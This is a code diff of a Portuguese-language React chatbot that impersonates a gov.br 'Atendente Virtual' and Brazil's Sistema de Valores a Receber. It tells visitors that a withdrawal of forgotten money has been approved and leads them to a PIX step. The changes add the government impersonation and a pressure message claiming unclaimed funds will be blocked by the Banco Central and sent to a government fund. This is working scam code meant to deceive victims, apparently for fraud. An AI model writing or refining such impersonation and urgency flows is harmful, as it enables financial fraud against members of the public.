@@ -95,6 +95,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(true);
         await sleep(1500);
         setTyping(false);
+        addBotMessage(`Olá, me chamo ${selectedAttendant.name} e sou sua Atendente Virtual do gov.br.`);
+
+        await sleep(1500);
+        setTyping(true);
+        await sleep(1500);
+        setTyping(false);
         addBotMessage("Iniciando conexão segura com o Sistema de Valores a Receber (SVR)...");
 
         await sleep(1500);
@@ -146,14 +152,14 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
         const isCnpj = data.docType.toUpperCase() === 'CNPJ';
         if (isCnpj) {
-          addBotMessage(`Autenticação confirmada para a empresa: **${name}**.\n\nVocê confirma que é o representante legal?`, [
-            { text: "Sim, sou eu", action: "confirm_identity_yes" },
-            { text: "Não, está errado", action: "confirm_identity_no" }
+          addBotMessage(`Agora que confirmamos a identidade da empresa **${name}**, conseguimos prosseguir com a solicitação. Antes, por favor, confirme se os dados retornados estão corretos.`, [
+            { text: "Sim, estão corretos", action: "confirm_identity_yes" },
+            { text: "Não, estão errados", action: "confirm_identity_no" }
           ]);
         } else {
-          addBotMessage(`Autenticação confirmada em nome de: **${name}**.\n\nVocê confirma que é você?`, [
-            { text: "Sim, sou eu", action: "confirm_identity_yes" },
-            { text: "Não, está errado", action: "confirm_identity_no" }
+          addBotMessage(`Agora que confirmamos a identidade de **${name}**, conseguimos prosseguir com a solicitação. Antes, por favor, confirme se os dados retornados estão corretos.`, [
+            { text: "Sim, estão corretos", action: "confirm_identity_yes" },
+            { text: "Não, estão errados", action: "confirm_identity_no" }
           ]);
         }
 
@@ -217,7 +223,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
         return newMessages;
       });
-      addUserMessage("Sim, sou eu");
+      addUserMessage("Sim, estão corretos");
       setTyping(true);
 
       setTimeout(() => {
@@ -228,24 +234,11 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
-            const isCnpj = data.docType.toUpperCase() === 'CNPJ';
-            if (isCnpj) {
-              addBotMessage(`Parabéns, representante! A solicitação de saque da empresa **${leadName}** foi aprovada no valor de ${leadValue} referentes a saldos inativos vinculados ao CNPJ ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
-            } else {
-              addBotMessage(`Parabéns, ${leadName}! A sua solicitação de saque foi aprovada no valor de ${leadValue} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
-            }
-            
-            setTimeout(() => {
-              setTyping(true);
-              setTimeout(() => {
-                setTyping(false);
-                addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, [
-                  { text: "Já assisti o vídeo / Prosseguir", action: "proceed_after_video" }
-                ], undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
-              }, 3000);
-            }, 4000);
-          }, 3500);
-        }, 2500);
+            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada.\n\nClique no botão abaixo para efetuar a transferência do valor de **${leadValue}** para a sua conta.`, [
+              { text: "Efetuar saque", action: "proceed_after_video" }
+            ]);
+          }, 2500);
+        }, 1500);
       }, 800);
     }
     else if (action === "confirm_identity_no") {
@@ -267,14 +260,14 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
         return newMessages;
       });
-      addUserMessage("Já assisti o vídeo / Prosseguir");
+      addUserMessage("Efetuar saque");
       setTyping(true);
       
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nObservação: Isso só acontecerá se você não concluir a etapa a seguir.`, [
-           { text: "Entendi, quero receber", action: "ask_pix" }
-        ], "/assets/banners/banner_atencao.png");
+        addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber o valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
+           { text: "Efetuar Saque", action: "ask_pix" }
+        ]);
       }, 1500);
     }
     else if (action === "ask_pix") {
